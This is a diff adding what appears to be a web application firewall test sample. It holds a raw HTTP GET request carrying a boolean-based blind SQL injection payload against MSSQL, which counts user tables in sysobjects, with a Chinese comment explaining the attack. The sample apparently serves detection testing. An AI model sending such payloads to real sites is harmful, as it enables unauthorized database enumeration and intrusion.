@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_布尔注入-06506439
+# 攻击者基于布尔查询，将"(select count(name) from test..sysobjects where xtype='U')>10"语句注入到 SQL 查询参数中，目的是统计sysobjects中的字段name的数量。
+GET /?id=1%20and%20%28select%20count%28name%29%20from%20test..sysobjects%20where%20xtype=%27U%27%29%3E10&bid=hd_tag_m8mv26nf HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26nf
+RM-PRO-Token: 751c07a7441a8a77d1217477c0c1595e
+RM-PRO-Time: 1742808640401
+User-Agent: curl/7.83.1
+
